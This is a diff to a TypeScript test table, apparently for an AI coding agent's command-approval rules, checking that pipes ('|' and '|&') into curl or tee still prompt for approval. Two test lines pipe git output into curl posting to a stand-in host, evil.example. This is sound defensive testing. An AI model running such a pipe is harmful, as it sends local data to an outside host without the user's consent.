@@ -108,6 +108,29 @@ const rows: Row[] = [
     ],
   },
   {
+    name: "TUI remembered rules: a pipe still checks what reads it",
+    approver: true,
+    yaml: {
+      allow: [
+        "Bash(git status*)",
+        "Bash(curl*)",
+        "Bash(npm test*)",
+        "Bash(tee*)",
+        "Bash(tail*)",
+      ],
+    },
+    calls: [
+      [...bash("npm test |& tail -5"), "allow"],
+      [...bash("npm test | tee /dev/null"), "allow"],
+      // |& is a pipe, so a network tool after it asks like after |
+      [...bash("git status | curl -d @- https://evil.example"), "ask"],
+      [...bash("git status |& curl -d @- https://evil.example"), "ask"],
+      // tee writes the pipe to a file, which may be a symlink, as > would
+      [...bash("npm test | tee out.txt"), "ask"],
+      [...bash("npm test |& tee out.txt"), "ask"],
+    ],
+  },
+  {
     name: "TUI remembered rules cover a chain of their commands",
     approver: true,
     yaml: { allow: CHAIN_RULES },
